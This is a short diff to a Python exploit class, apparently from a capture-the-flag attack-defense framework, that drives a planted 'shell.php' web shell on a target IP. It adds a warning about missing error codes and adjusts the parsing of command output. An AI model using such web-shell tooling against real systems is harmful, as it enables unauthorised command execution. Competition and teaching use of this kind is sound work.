@@ -10,6 +10,9 @@ COLOR_FAIL = '\033[91m'
 COLOR_END = '\033[0m'
 
 class ChallengeTwoShellPHP(Exploit):
+	"""
+	WARNING: It's a bit tricky to tell if our commands were successful because `shell.php` does not return error codes or stderr, make sure to add 'echo $?' or something similar to the end of the command.
+	"""
 	def __init__(self, ip_address) -> None:
 		super().__init__(ip_address=ip_address)
 
@@ -21,7 +24,7 @@ class ChallengeTwoShellPHP(Exploit):
 		if server_status_code == 404:
 			raise PatchedException(f"Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`")
 		server_response_text = server_response.text
-		command_output = server_response_text.split(f"{command}\n")[1].split("\n</body>")[0]
+		command_output = server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
 		logger.info(f"Command returned `{command_output}`.")
 		return command_output
 
